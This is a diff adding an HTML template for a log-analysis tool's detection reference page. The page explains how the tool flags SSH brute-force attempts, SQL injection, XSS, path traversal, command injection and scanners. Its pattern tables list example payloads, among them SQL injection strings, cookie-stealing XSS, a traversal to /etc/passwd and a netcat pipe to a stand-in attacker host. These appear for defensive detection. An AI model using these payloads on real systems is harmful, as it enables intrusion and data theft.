@@ -1,0 +1,81 @@
+{% extends "base.html" %}
+{% block title %}Detection Reference — PhantomLog{% endblock %}
+{% block content %}
+
+<div class="card">
+  <div class="card-title"><i class="fa-solid fa-shield-halved"></i> What PhantomLog Detects</div>
+  <p style="color:var(--text-mid);font-size:13px;margin-bottom:8px">
+    Full transparency on detection logic — no black boxes. All pattern matching happens locally;
+    query strings and paths are URL-decoded first so encoded payloads (e.g. <code>%3Cscript%3E</code>) aren't missed.
+  </p>
+</div>
+
+<div class="card">
+  <div class="card-title"><i class="fa-solid fa-key"></i> SSH Brute-Force (auth.log)</div>
+  <p style="font-size:12.5px;color:var(--text-mid);margin-bottom:10px">
+    Groups failed logins by source IP using a sliding time window (default: 5+ failures within 5 minutes).
+    If a <strong style="color:var(--text-hi)">successful login follows a brute-force burst from the same IP</strong>,
+    severity escalates to <span class="sev-badge critical">CRITICAL</span> — possible account compromise.
+  </p>
+</div>
+
+<div class="card">
+  <div class="card-title"><i class="fa-solid fa-database"></i> SQL Injection</div>
+  <table class="pattern-table">
+    <tr><th>Pattern</th><th>Example</th></tr>
+    <tr><td>UNION SELECT</td><td><code>?id=1 UNION SELECT user,pass FROM users</code></td></tr>
+    <tr><td>Tautology (OR 1=1)</td><td><code>?id=1' OR '1'='1</code></td></tr>
+    <tr><td>Stacked query (DROP/DELETE)</td><td><code>?id=1; DROP TABLE users;--</code></td></tr>
+    <tr><td>Time-based blind (SLEEP/WAITFOR)</td><td><code>?id=1 AND SLEEP(5)</code></td></tr>
+    <tr><td>information_schema probe</td><td><code>?id=1 UNION SELECT table_name FROM information_schema.tables</code></td></tr>
+  </table>
+</div>
+
+<div class="card">
+  <div class="card-title"><i class="fa-solid fa-code"></i> Cross-Site Scripting (XSS)</div>
+  <table class="pattern-table">
+    <tr><th>Pattern</th><th>Example</th></tr>
+    <tr><td>Script tag injection</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+    <tr><td>Inline event handler</td><td><code>&lt;img src=x onerror=alert(1)&gt;</code></td></tr>
+    <tr><td>javascript: URI</td><td><code>javascript:alert(document.cookie)</code></td></tr>
+    <tr><td>Cookie theft</td><td><code>document.cookie</code> in payload</td></tr>
+  </table>
+</div>
+
+<div class="card">
+  <div class="card-title"><i class="fa-solid fa-folder-tree"></i> Path Traversal & Command Injection</div>
+  <table class="pattern-table">
+    <tr><th>Pattern</th><th>Example</th></tr>
+    <tr><td>Directory traversal</td><td><code>../../../../etc/passwd</code></td></tr>
+    <tr><td>Windows traversal</td><td><code>..\..\boot.ini</code></td></tr>
+    <tr><td>Command chaining</td><td><code>; cat /etc/passwd</code>, <code>| nc attacker.com 4444</code></td></tr>
+    <tr><td>Command substitution</td><td><code>$(whoami)</code>, <code>`id`</code></td></tr>
+  </table>
+</div>
+
+<div class="card">
+  <div class="card-title"><i class="fa-solid fa-magnifying-glass"></i> Scanners & Enumeration</div>
+  <table class="pattern-table">
+    <tr><th>Detection</th><th>Trigger</th></tr>
+    <tr><td>Known scanner tool</td><td>User-Agent contains sqlmap, nikto, nmap, gobuster, wpscan, masscan, etc.</td></tr>
+    <tr><td>Sensitive path probe</td><td>Requests to <code>/.env</code>, <code>/.git/config</code>, <code>/wp-admin</code>, <code>/phpmyadmin</code>, etc.</td></tr>
+    <tr><td>Directory enumeration</td><td>15+ different 404 responses from one IP within 5 minutes</td></tr>
+    <tr><td>Web login brute-force</td><td>8+ failed logins (401/403) to a login-like path within 5 minutes</td></tr>
+    <tr><td>Rate anomaly</td><td>60+ requests from one IP within 1 minute</td></tr>
+  </table>
+</div>
+
+<div class="card">
+  <div class="card-title"><i class="fa-solid fa-circle-info"></i> Severity Levels</div>
+  <div style="display:flex;gap:10px;flex-wrap:wrap">
+    <span class="sev-badge critical">Critical</span>
+    <span class="sev-badge high">High</span>
+    <span class="sev-badge medium">Medium</span>
+    <span class="sev-badge low">Low</span>
+  </div>
+  <p style="font-size:12px;color:var(--text-mid);margin-top:10px">
+    Overall threat level = the highest severity found anywhere in the log.
+  </p>
+</div>
+
+{% endblock %}
